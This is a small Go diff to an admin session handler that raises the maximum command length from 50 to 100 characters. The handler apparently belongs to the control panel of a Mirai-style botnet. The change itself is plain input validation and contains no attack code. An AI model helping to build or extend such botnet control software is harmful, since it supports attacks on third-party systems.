@@ -240,8 +240,8 @@ func (this *Admin) Handle() {
 			continue
 		}
 
-		if len(cmd) > 50 {
-            this.conn.Write([]byte("\033[1;37mCommand Exceeds The Max String Size.")) // dont want someone tryna spam more than 50 chars, it should be enough anyways
+		if len(cmd) > 100 {
+            this.conn.Write([]byte("\033[1;37mCommand Exceeds The Max String Size.")) // dont want someone tryna spam more than 100 chars, it should be enough anyways
             fmt.Println("\033[1;37m " + username + " Just Attempted To Exceed The Max Command Size, Their Session Has Been Closed")
             time.Sleep(time.Duration(1000) * time.Millisecond)
             return
